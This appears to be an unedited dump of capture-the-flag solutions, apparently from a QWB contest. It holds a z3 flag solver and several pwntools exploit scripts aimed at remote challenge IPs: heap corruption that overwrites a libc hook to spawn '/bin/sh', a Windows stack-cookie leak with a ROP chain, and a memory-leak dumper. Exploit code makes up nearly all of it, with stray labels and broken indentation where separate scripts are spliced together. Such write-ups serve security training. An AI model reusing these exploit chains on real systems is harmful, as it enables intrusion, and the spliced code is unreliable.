s.add(-120743 * flag[10]+ 77375 * flag[5]+ -164339 * flag[3]+ 167370 * flag[25]+
 -225830 * flag[4]+ -136952 * flag[2]+ -14347 * flag[8]+ 6966 * flag[26]+ 88628 
* flag[18]+ 138998 * flag[22]+ 147747 * flag[19]+ -106792 * flag[6]+ -113009 * f
lag[20]+ 98136 * flag[15]+ 231264 * flag[24]+ -109447 * flag[17]+ 258890 * flag[
1]+ 167885 * flag[16]+264405 * flag[11]+ 135302 * flag[12]+ 278196 * flag[9]+ -1
32906 * flag[23]+ 138308 * flag[7]+ 40423 * flag[21]+ 157781 * flag[0]+ -38949 *
 flag[27]+ -143324 * flag[14]+ 246315 * flag[13]==133068723)
assert s.check() == sat
m = s.model()
print(bytearray([m[each].as_long() for each in flag]).decode())
# flag{g0_Fuck_xx_5egm3nt_0bf}
from pwn import *
context.log_level="debug"
def add(index,size):
    p.sendlineafter(": ","1")
    p.sendlineafter(": ",str(index))
    p.sendlineafter(": ",str(size))
def edit(index,offset,size,note):
    p.sendlineafter(": ","2")
    p.sendlineafter(": ",str(index))
    p.sendlineafter(": ",str(offset))
    p.sendlineafter(": ",str(size))
    p.sendafter(": ",note)
easyoverﬂow
def delete(index):
    p.sendlineafter(": ","3")
    p.sendlineafter(": ",str(index))
def open_():
      p.sendlineafter(": ","4")
def close_():
      p.sendlineafter(": ","5")
#p=process("./direct")
p=remote("106.14.214.3",1912)
add(0,0x18)
add(1,0x18)
open_()
add(2,0x18)
edit(0,-8,8,p64(0x8081))
close_()
delete(0)
add(10,0x18)
add(3,0x78)
add(4,0x88)
edit(4,-8,8,"b"*8)
close_()
p.recvuntil("b"*5)
addr=u64(p.recv(6)+"\x00\x00")+0x7ffff79e4000-0x7ffff7dcfca0
print hex(addr)
#delete()
#addr=0x7ffff79e4000 
delete(1)
edit(3,0,8,p64(addr+0x3ed8e8))
#gdb.attach(p)
add(5,0x78)
edit(5,0,8,"/bin/sh\x00")
add(6,0x78)
edit(6,0,8,p64(addr+0x04f4e0))
delete(5)
p.interactive()
from pwn import *
context.log_level = 'debug'
r = lambda x: p.recvuntil(x, drop=True)
s = lambda x, y: p.sendafter(x, y)
sl = lambda x, y: p.sendlineafter(x, y)
p = remote('39.99.46.209', 13389)
r('input:\r\n')
p.send('a'*0x100)
r('buffer:\r\n')
r('a'*0x100)
cookie = u64(r('\r\n').ljust(0x8,'\x00'))
log.info('cookie: '+hex(cookie))
kernel32=0x7ffbbc640000
ntdll = 0x7ffbbe6b0000
exec_addr = 0x7ff6fcba0000
#0x158 kernel32
#0x188 ntdll
#0x118 exec
leak
远程Python没开PIE，结合leak以及二分法确定tmplib的位置，然后计算出其与libc的偏移
通过ELF_SYM中的函数名与函数地址，计算出yes_ur_ﬂag的位置
dump出yes_ur_ﬂag函数即可
r('input:\r\n')
p.send('a'*0x118)
r('buffer:\r\n')
r('a'*0x118)
exec_addr = u64(r('\r\n').ljust(0x8,'\x00'))-0x12f4
log.info('exec: '+hex(exec_addr))
pop_rcx = ntdll + 0x9217b
ucrt_addr= 0x7ffbbb4d0760-0x80760
rop = 'a'*0x100
rop += p64(cookie)
rop += 2*p64(0)
rop += p64(pop_rcx+1)+p64(pop_rcx)+p64(ucrt_addr+0xCC9F0)+p64(ucrt_addr+0xABBA0)
#rop += p64(pop_rcx+1) + p64(pop_rcx) + p64(exec_addr+0x2180) 
+p64(exec_addr+0x107b)
r('input:\r\n')
p.send(rop)
p.recvuntil("\r\n")
p.recvuntil("\r\n")
p.interactive()
from pwn import *
import random
import string
context.log_level = 'debug'
p = remote('39.101.177.128', 9999)
# p = process("python leak.py",shell=True)
libc = ELF("./libc-2.23.so")
def passpow(io, difficulty):
io.readuntil("[+] sha256(")
prefix = io.readuntil("+")[:-1]
while True:
answer = ''.join(random.choice(string.ascii_letters + string.digits) for i in 
range(8))
hashresult = hashlib.sha256(prefix+answer).digest()
bits = ''.join(bin(ord(j))[2:].zfill(8) for j in hashresult)
if bits.startswith('0'*difficulty):
io.sendline(answer)
# io.readuntil("=")
return
def show(addr):
p.sendlineafter("addr?:",hex(addr))
return p.recv(16)
def calc(typex,num,addr):
tmp_addr = 0
print int(num)
if typex == 'not_ur_flag':
tmp_addr = addr-int(num)*19
elif typex == 'yes_ur_flag':
tmp_addr = addr
else:
exit(0)
return tmp_addr
# p.sendline('')
# p.sendline('')
passpow(p, 16)
# p.interactive()
# p.readuntil("=")
p.sendline('icqaf0ecae2322e454ba574617e58ef7')
uname = 0x8DD1C0
tmp = show(uname)
tmp = u64(tmp[:8])
offset1 = tmp-libc.sym['uname']
success(hex(offset1))
tmp = 0x9532a0
tmp = show(tmp)
tmp = u64(tmp[:8])
success(hex(tmp))
tmp = tmp-0x11e0
success(hex(tmp))
tmp = show(tmp)
print tmp
tmp = u64(tmp[:8])
success(hex(tmp))
p.interactive()
from pwn import *
import random
import requests
p = remote('39.101.177.128', 9999)
#p = process("python pwn1.py",shell=True)
def passpow(io, difficulty):
    io.readuntil("[+] sha256(")
    prefix = io.readuntil("+")[:-1]
    while True:
        answer = ''.join(random.choice(string.ascii_letters + string.digits) for 
i in range(8))
        hashresult = hashlib.sha256(prefix+answer).digest()
        bits = ''.join(bin(ord(j))[2:].zfill(8) for j in hashresult)
        if bits.startswith('0'*difficulty):
            io.sendline(answer)
            # io.readuntil("=")
            return
def show(addr):
    p.sendlineafter("?:",hex(addr))
    return p.recvuntil("addr")
def calc(typex,num,addr):
    tmp_addr = 0
    print int(num)
    if typex == 'not_ur_flag':
        tmp_addr = addr-int(num)*19
    elif typex == 'yes_ur_flag':
        tmp_addr = addr
    else:
        exit(0)
    return tmp_addr
# p.sendline('')
# p.sendline('')
passpow(p, 16)
#p.interactive()
p.sendlineafter("[+] teamtoken:",'icqaf0ecae2322e454ba574617e58ef7')
tmp = show(0x8DD270)
tmp = u64(tmp[:8])
libc_addr = tmp + 0x7f673598b000 - 0x7f6735d654f0
print hex(libc_addr)
context.log_level = 'debug'
#204000  - > libdl-2.23.so
#92a000  -> libm-2.23.so
tmp=libc_addr-0xc02000-0xa000-0x208000-0x102000-0x230000-0x286000
tmp=tmp-0x195000#crypt
tmp=tmp-0x205000-0x1f000
tmp=tmp-0xf0f000-0x550000
tmp=tmp+0xf0f000+0x550000-0x200000-0xf000-0x4f000#libssl
tmp=tmp-0x40d000*2-0xf0000-0xf000-0xf000*13-0x1000*22-0xf000
print hex(tmp)
print hex(tmp-libc_addr)
offset = tmp
success(hex(offset))
tmp = offset+0x4E970
tmp = show(tmp)
name = u32(tmp[:4])+0x4e988+offset
func = u64(tmp[8:16])+offset
success("name:"+hex(name-offset))
success("func:"+hex(func-offset))
tmp = show(name)
tmp = tmp[:tmp.index("\x00")]
typex = tmp[:11]
num = tmp[11:]
print typex
print num
addr = calc(typex,num,func)-35
f=open("./test","ab+")
tmp = show(addr-16*4)
f.write(tmp)
tmp = show(addr-16*5)
f.write(tmp)
f.close()
p.interactive()
#ctf{pleAse_fInd_aNd_Leak_Me_*_*}
oldschool
nc 106.14.214.3 2333
http://112.126.59.156:8080/s/4j2RbNpjaf3AbL4/download
QWBlogin
nc 47.94.20.173 32142
from pwn import *
context.log_level="debug"
p=process("./a.out")
def add(index,size):
    p.sendlineafter(": ","1")
    p.sendlineafter(": ",str(index))
    p.sendlineafter(": ",str(size))
def edit(index,note):
    p.sendlineafter(": ","2")
    p.sendlineafter(": ",str(index))
    p.sendlineafter(": ",note)
def show(index):
    p.sendlineafter(": ","3")
    p.sendlineafter(": ",str(index))
def delete(index):
    p.sendlineafter(": ","4")
    p.sendlineafter(": ",str(index))
def addmap(index):
    p.sendlineafter(": ","6")
    p.sendlineafter(": ",str(index))
def deletemap():
    p.sendlineafter(": ","8")
def editmap(index,value):
    p.sendlineafter(": ","7")
    p.sendlineafter(": ",str(index))
    p.sendlineafter(": ",str(value))
p=remote("106.14.214.3",2333)
for i in range(8):
    add(i,0x100)
for i in range(8):
    delete(7-i)
for i in range(7):
    add(i,0x100)
add(10,0x100)
edit(10,"aaaa\n")
show(10)
p.recvuntil("aaaa")
addr=u32(p.recv(4))+0xf7dd9000-0xf7fb170a
print hex(addr)
#gdb.attach(p)
addmap(0)
editmap((addr+0xf7fb28d0-0xf7dd9000-0xe0000000)/4,addr+0x03d250)
edit(0,"/bin/sh\x00\n")
delete(0)
p.interactive()
http://112.126.59.156:8080/s/6Teqzb4ECQpPZ54/download
hint附件：http://112.126.59.156:8080/s/Wsg2b2xMQjSr8n4/download
from pwn import *
f = open('./binbin','rb')
a = f.read()
f.close()
o = open('o.txt','w+')
pc = 0
regs=
['r0','r1','r2','r3','r4','r5','r6','r7','r8','r9','r10','r11','r12','r13','r14'
,'r15','sp','bp']
while pc <len(a):
    print "inst:"+(a[pc]).encode('hex')
    if a[pc] == '\x00':
        o.write('GG\n')
        pc+=1
        continue
    elif a[pc] == '\x01':
        tmp ='mov '
        pc+=1